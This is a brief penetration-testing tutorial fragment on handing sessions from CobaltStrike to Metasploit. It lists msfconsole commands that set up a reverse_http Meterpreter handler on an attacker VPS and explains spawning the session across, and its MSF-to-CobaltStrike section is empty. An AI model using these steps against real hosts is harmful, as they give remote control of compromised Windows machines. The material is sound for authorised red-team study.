## Penetration testing & MSF linked with CobaltStrike

## CobaltStrike->MSF

Run `msfconsole` to start listening.

``
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost vps_ip
set lport 44444
set lhost vps_ip set lport 44444
```

! [](img/1.png)

Next `CobaltStrike` creates an external listener with `Host` and `Port` as `lhost` and `lport`.

! [](img/2.png)

Next the session is spawned over, the command `spawn 105-msf` is executed on the `CobaltStrike` console, and `msf` receives that the spawned session went live successfully.

! [](img/3.png)



## MSF->CobaltStrike
